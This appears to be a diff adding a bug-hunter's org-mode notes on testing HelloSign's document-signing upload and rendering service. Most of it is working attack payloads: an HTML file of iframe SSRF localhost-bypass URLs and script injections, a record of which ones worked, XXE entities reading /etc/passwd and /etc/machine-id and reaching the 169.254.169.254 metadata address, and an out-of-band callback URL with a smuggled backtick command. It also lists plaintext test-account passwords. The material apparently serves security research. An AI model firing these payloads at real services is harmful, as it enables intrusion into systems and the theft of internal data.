@@ -1,0 +1,364 @@
+#+title: Hello Sign Area
+
+
+
+
+* TODO Tasks [1/7]
+Setup multiple accounts with diffrent roles for testing
+
+#+Name: Auth
+| Email                   | username                | password             | phone | user-id/jwt/cookie | Notes/tags  |
+|-------------------------+-------------------------+----------------------+-------+--------------------+-------------|
+| day.sneak.fate@cloak.id | day.sneak.fate@cloak.id | $tUV~Q65HnPvq5pn.H.e | nil   | TODO               | second user |
+| hip.store.raw@cloak.id  | hip.store.raw@cloak.id  | agreeenjoywaste      | nil   | TODO               | Main user  |
+
+#+Name: auth-urls
+| Url                                                                                                                                                    | Cookies? | code | params/body                         | tags/notes           |
+|--------------------------------------------------------------------------------------------------------------------------------------------------------+----------+------+-------------------------------------+----------------------|
+| https://app.hellosign.com/attachment/upload/form_id/tsm_group_request/preloaded_tsm_group_key/c72d42143ffbad9b69612c30fc4351b4e8e93fa5/load_pdf_info/1 | yes      |  200 | name="file"; filename="iframe.html" | multipart,fileupload |
+|                                                                                                                                                        |          |      |                                     |                      |
+|                                                                                                                                                        |          |      |                                     |                      |
+
+** DONE Setup
+*** DONE Setup accounts and roles
+** IDEA Add filters for user data
+Add filters/greps for your user data to find api endpoints
+
+** TODO Test un-auth
+Just remove cookies and see what happens
+** TODO Test hyjack
+attempt to replace other user email/password/important info
+** TODO Other accoutn actions
+Test any authencated
+** TODO Test CSRF
+** TODO Test fileupload
+Files ti be signed are send to https://app.hellosign.com/attachment/upload/form_id/tsm_group_request/preloaded_tsm_group_key/c72d42143ffbad9b69612c30fc4351b4e8e93fa5/load_pdf_info/1
+
+** TODO ssrf [0/2]
+*** TODO Document sign
++ [X] Try setting a A record to 127.0.0.1
+  + My domain: ssrf-test.bug-solutions.de
++ [ ] Try encoding localhost
++ [ ] port scanning?
++ [ ] webserver to redirect the client?
+  #+begin_src html :tangle ../exploits/localhost.html
+
+<body>
+<h1>Payload: SSRF advisor</h1>
+<iframe src="https://ncdn65fw.c5.rs" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: A domain pointing to 127.0.0.1</h1>
+<iframe src="http://ssrf-test.bug-solutions.de" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: A domain pointing to 127.0.0.1:80</h1>
+<iframe src="http://ssrf-test.bug-solutions.de:80" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: A domain pointing to 127.0.0.1:8080</h1>
+<iframe src="http://ssrf-test.bug-solutions.de:8080" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: A domain pointing to 127.0.0.1:443</h1>
+<iframe src="http://ssrf-test.bug-solutions.de:443" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: </h1>
+<iframe src="http://ssrf-test.bug-solutions.de:443" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload:  </h1>
+<iframe src="http://cnr6qn62vtc00003k48ggkhdm4hyyyyyb.oast.fun`id`" width="800" height="600" frameborder="0"></iframe>
+
+<h1>Payload:src="x" onerror="document.write('test')"</h1>
+<img src="x" onerror="document.write('nsaspy document write')" />
+
+<h1>document.write(JSON.stringify(window.location))</h1>
+<script>document.write(JSON.stringify(window.location))</script>
+
+<h1>document.write(JSON.stringify(window.location))</h1>
+<script>document.write('<iframe src="'+window.location.href+'"></iframe>')</script>
+<h1>Payload: http://127.0.0.1:80</h1>
+<iframe src="http://127.0.0.1:80" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://127.0.0.1:443</h1>
+<iframe src="http://127.0.0.1:443" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://127.0.0.1:22</h1>
+<iframe src="http://127.0.0.1:22" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://127.1:80</h1>
+<iframe src="http://127.1:80" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://127.000000000000000.1</h1>
+<iframe src="http://127.000000000000000.1" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://0</h1>
+<iframe src="http://0" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http:@0/ --> http://localhost/</h1>
+<iframe src="http:@0/ --> http://localhost/" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://0.0.0.0:80</h1>
+<iframe src="http://0.0.0.0:80" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://localhost:80</h1>
+<iframe src="http://localhost:80" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://[::]:80/</h1>
+<iframe src="http://[::]:80/" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://[::]:25/ SMTP</h1>
+<iframe src="http://[::]:25/ SMTP" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://[::]:3128/ Squid</h1>
+<iframe src="http://[::]:3128/ Squid" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://[0000::1]:80/</h1>
+<iframe src="http://[0000::1]:80/" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://[0:0:0:0:0:ffff:127.0.0.1]/thefile</h1>
+<iframe src="http://[0:0:0:0:0:ffff:127.0.0.1]/thefile" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://①②⑦.⓪.⓪.⓪</h1>
+<iframe src="http://①②⑦.⓪.⓪.⓪" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: # CDIR bypass</h1>
+<iframe src="# CDIR bypass" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://127.127.127.127</h1>
+<iframe src="http://127.127.127.127" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://127.0.1.3</h1>
+<iframe src="http://127.0.1.3" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://127.0.0.0</h1>
+<iframe src="http://127.0.0.0" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: # Dot bypass</h1>
+<iframe src="# Dot bypass" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: 127。0。0。1</h1>
+<iframe src="127。0。0。1" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: 127%E3%80%820%E3%80%820%E3%80%821</h1>
+<iframe src="127%E3%80%820%E3%80%820%E3%80%821" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: # Decimal bypass</h1>
+<iframe src="# Decimal bypass" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://2130706433/ = http://127.0.0.1</h1>
+<iframe src="http://2130706433/ = http://127.0.0.1" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://3232235521/ = http://192.168.0.1</h1>
+<iframe src="http://3232235521/ = http://192.168.0.1" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://3232235777/ = http://192.168.1.1</h1>
+<iframe src="http://3232235777/ = http://192.168.1.1" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: # Octal Bypass</h1>
+<iframe src="# Octal Bypass" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://0177.0000.0000.0001</h1>
+<iframe src="http://0177.0000.0000.0001" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://00000177.00000000.00000000.00000001</h1>
+<iframe src="http://00000177.00000000.00000000.00000001" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://017700000001</h1>
+<iframe src="http://017700000001" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: # Hexadecimal bypass</h1>
+<iframe src="# Hexadecimal bypass" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: 127.0.0.1 = 0x7f 00 00 01</h1>
+<iframe src="127.0.0.1 = 0x7f 00 00 01" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://0x7f000001/ = http://127.0.0.1</h1>
+<iframe src="http://0x7f000001/ = http://127.0.0.1" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://0xc0a80014/ = http://192.168.0.20</h1>
+<iframe src="http://0xc0a80014/ = http://192.168.0.20" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: 0x7f.0x00.0x00.0x01</h1>
+<iframe src="0x7f.0x00.0x00.0x01" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: 0x0000007f.0x00000000.0x00000000.0x00000001</h1>
+<iframe src="0x0000007f.0x00000000.0x00000000.0x00000001" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: # Add 0s bypass</h1>
+<iframe src="# Add 0s bypass" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: 127.000000000000.1</h1>
+<iframe src="127.000000000000.1" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: # You can also mix different encoding formats</h1>
+<iframe src="# You can also mix different encoding formats" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: # https://www.silisoftware.com/tools/ipconverter.php</h1>
+<iframe src="# https://www.silisoftware.com/tools/ipconverter.php" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: # Malformed and rare</h1>
+<iframe src="# Malformed and rare" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: localhost:+11211aaa</h1>
+<iframe src="localhost:+11211aaa" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: localhost:00011211aaaa</h1>
+<iframe src="localhost:00011211aaaa" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://0/</h1>
+<iframe src="http://0/" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://127.1</h1>
+<iframe src="http://127.1" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://127.0.1</h1>
+<iframe src="http://127.0.1" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: localtest.me = 127.0.0.1</h1>
+<iframe src="localtest.me = 127.0.0.1" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1</h1>
+<iframe src="customer1.app.localhost.my.company.127.0.0.1.nip.io = 127.0.0.1" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: mail.ebc.apple.com = 127.0.0.6 (localhost)</h1>
+<iframe src="mail.ebc.apple.com = 127.0.0.6 (localhost)" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: 127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)</h1>
+<iframe src="127.0.0.1.nip.io = 127.0.0.1 (Resolves to the given IP)" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com</h1>
+<iframe src="www.example.com.customlookup.www.google.com.endcustom.sentinel.pentesting.us = Resolves to www.google.com" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://customer1.app.localhost.my.company.127.0.0.1.nip.io</h1>
+<iframe src="http://customer1.app.localhost.my.company.127.0.0.1.nip.io" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: http://bugbounty.dod.network = 127.0.0.2 (localhost)</h1>
+<iframe src="http://bugbounty.dod.network = 127.0.0.2 (localhost)" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: 1ynrnhl.xip.io == 169.254.169.254</h1>
+<iframe src="1ynrnhl.xip.io == 169.254.169.254" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: spoofed.burpcollaborator.net = 127.0.0.</h1>
+<iframe src="spoofed.burpcollaborator.net = 127.0.0." width="800" height="600" frameborder="0"></iframe>
+</body>
+  #+end_src
+
+  A few of them worked,
+  #+begin_src html :tangle ../exploits/localhost2.html
+<html>
+<body>
+<h1>Payload: customer1.app.localhost.my.company.127.0.0.1.nip.io:22 = 127.0.0.1</h1>
+<iframe src="customer1.app.localhost.my.company.127.0.0.1.nip.io:22 = 127.0.0.1" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: customer1.app.localhost.my.company.127.0.0.1.nip.io:80 = 127.0.0.1</h1>
+<iframe src="customer1.app.localhost.my.company.127.0.0.1.nip.io:80 = 127.0.0.1" width="800" height="600" frameborder="0"></iframe>
+<h1>Payload: customer1.app.localhost.my.company.127.0.0.1.nip.io:443 = 127.0.0.1</h1>
+<iframe src="customer1.app.localhost.my.company.127.0.0.1.nip.io:443 = 127.0.0.1" width="800" height="600" frameborder="0"></iframe>
+
+<h1>Payload: customer1.app.localhost.my.company.127.0.0.1.nip.io:8080 = 127.0.0.1</h1>
+<iframe src="customer1.app.localhost.my.company.127.0.0.1.nip.io:8080 = 127.0.0.1" width="800" height="600" frameborder="0"></iframe>
+</body>
+</html>
+  #+end_src
+
+
+alright for today (<2023-12-08 Fri>) i am going to try XML related stuff
+#+begin_src xml :tangle ../exploits/xml-01.xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY example "Doe"> ]>
+ <userInfo>
+  <firstName>John</firstName>
+  <lastName>&example;</lastName>
+ </userInfo>
+#+end_src
+This worked, It rendered John doe.
+
+#+DOWNLOADED: screenshot @ 2023-12-08 06:24:13
+[[file:Tasks_\[1/7\]/2023-12-08_06-24-13_screenshot.png]]
+
+
+LFI???
+#+begin_src xml :tangle ../exploits/xml-02.xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
+<userInfo>
+ <firstName>John</firstName>
+ <lastName>&ent;</lastName>
+</userInfo>
+#+end_src
+Did not work, rendered nothing
+
+
+SSRF.
+
+#+begin_src xml :tangle ../exploits/xml-03a.xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [
+<!ELEMENT foo (#ANY)>
+<!ENTITY xxe SYSTEM "http://127.0.0.1">]><foo>&xxe;</foo>
+#+end_src
+This time got a enw error but not sure what it means..
+
+#+DOWNLOADED: screenshot @ 2023-12-08 06:32:18
+[[file:Tasks_\[1/7\]/2023-12-08_06-32-18_screenshot.png]]
+
+
+
+Another ssrf attempt..
+
+#+begin_src xml :tangle ../exploits/xml-05a.xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [
+  <!ELEMENT foo (#ANY)>
+  <!ENTITY localhost SYSTEM "localhost/">
+  <!ENTITY loopbackipv4 SYSTEM "127.0.0.1/">
+  <!ENTITY loopbackipv6 SYSTEM "http://[::1]/">
+  <!ENTITY port_8080 SYSTEM "localhost:8080/">
+  <!ENTITY port_8888 SYSTEM "http://localhost:8888/">
+  <!ENTITY custom_port SYSTEM "http://localhost:12345/">
+]>
+<foo>
+  <content>
+    &localhost; <!-- Replace with the actual content you want for localhost -->
+  </content>
+  <content>
+    &loopback_ipv4; <!-- Replace with the actual content you want for loopback IPv4 -->
+  </content>
+  <content>
+    &loopback_ipv6; <!-- Replace with the actual content you want for loopback IPv6 -->
+  </content>
+  <content>
+    &port_8080; <!-- Replace with the actual content you want for port 8080 -->
+  </content>
+  <content>
+    &port_8888; <!-- Replace with the actual content you want for port 8888 -->
+  </content>
+  <content>
+    &custom_port; <!-- Replace with the actual content you want for custom port -->
+  </content>
+</foo>
+#+end_src
+#+end_src
+
+#+begin_src xml :tangle ../exploits/aws2.xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE foo [
+  <!ELEMENT foo (#ANY)>
+  <!ENTITY foobar SYSTEM "http://169.254.169.254/">
+]>
+<foo>&foobar;</foo>
+#+end_src
+
+#+begin_src xml :tangle ../exploits/xml-6-fixed1.xml
+<?xml version="1.0" encoding="utf-8"?>
+<!DOCTYPE malicious [
+    <!ENTITY external SYSTEM "file:////etc/machine-id">
+]>
+<div>
+    &external;
+</div>
+#+end_src
+Will this work?
+#+begin_src xml :tangle ../exploits/test-dtd12.xml
+<?xml version="1.0"?><!DOCTYPE address [ <!ELEMENT address (name, email, phone, birthday)> <!ELEMENT name (first, last)> <!ELEMENT first (#PCDATA)> <!ELEMENT last (#PCDATA)> <!ELEMENT email (#PCDATA)> <!ELEMENT phone (#PCDATA)> <!ELEMENT birthday (year, month, day)> <!ELEMENT year (#PCDATA)> <!ELEMENT month (#PCDATA)> <!ELEMENT day (#PCDATA)> ]><address> <name> <first>Rohit</first> <last>Sharma</last> </name><email>sharmarohit@gmail.com</email><phone>9876543210</phone><birthday><year>1987</year><month>June</month><day>23</day></birthday></address>
+#+end_src
+Note to self: it will not work if you have the <?xml version="1.0"?>
+Heres it rendered with dtd
+
+#+DOWNLOADED: screenshot @ 2023-12-08 07:06:03
+[[file:Tasks_\[1/7\]/2023-12-08_07-06-03_screenshot.png]]
+
+Here lets add it...
+#+begin_src xml :tangle localhost-xml.xml
+<?xml version="1.0"?><!DOCTYPE address [ <!ELEMENT address (name, email, phone, birthday)> <!ELEMENT name (first, last)> <!ENTITY external SYSTEM "file:////etc/machine-id"> <!ELEMENT first (#PCDATA)> <!ELEMENT last (#PCDATA)> <!ELEMENT email (#PCDATA)> <!ELEMENT phone (#PCDATA)> <!ELEMENT birthday (year, month, day)> <!ELEMENT year (#PCDATA)> <!ELEMENT month (#PCDATA)> <!ELEMENT day (#PCDATA)> ]><address> <name> <first>Rohit</first> <last>Sharma</last> </name><email>sharmarohit@gmail.com</email><phone>9876543210</phone><birthday><year>1987</year><month>June</month><day>23</day><day>&external</day></birthday></address>
+#+end_src
+#+end_src
+
+**** TODO XXE from powerpoint or other types?
+
+*** TODO API page
+**** TODO ssrf [1/4]
++ [X] Try setting a A record to 127.0.0.1
+  + My domain: ssrf-test.bug-solutions.de
++ [ ] Try encoding localhost
++ [ ] port scanning?
++ [ ] webserver to redirect the client?
+** TODO cache poisoning is possible if cache header is > 0
+
+* Notes
+Def vuln to external ssrf via iframe.
+
+Dropbox has made some ssrf with gopher harder vya a patched curl, but sign app is a purchase so this might not be the case here
+They also use a squid proxy to catch ssrf
+
+The client that renders os wkhtmltopdf
+
+** HTTP headers
+#+begin_src http
+GET / HTTP/1.0
+Host: dq2xv1k9.c5.rs
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Encoding: gzip
+Accept-Language: en,*
+Connection: close
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/534.34 (KHTML, like Gecko) wkhtmltopdf Safari/534.34
+#+end_src
+
+** Support file types/requirements[fn:1]
+A single file can't exceed 40MB.
+A single request can't exceed 500 pages and/or 40 files.
++ .doc
++ .docx
++ .pdf
++ .ppsx
++ .ppt
++ .pptx
++ .jpg
++ .jpeg
++ .png
++ .xls
++ .xlsx
++ .txt
++ .html
++ .gif
++ .xml
+
+* Footnotes
+
+[fn:1] https://faq.hellosign.com/hc/en-us/articles/205714918--Dropbox-Sign-system-requirements-
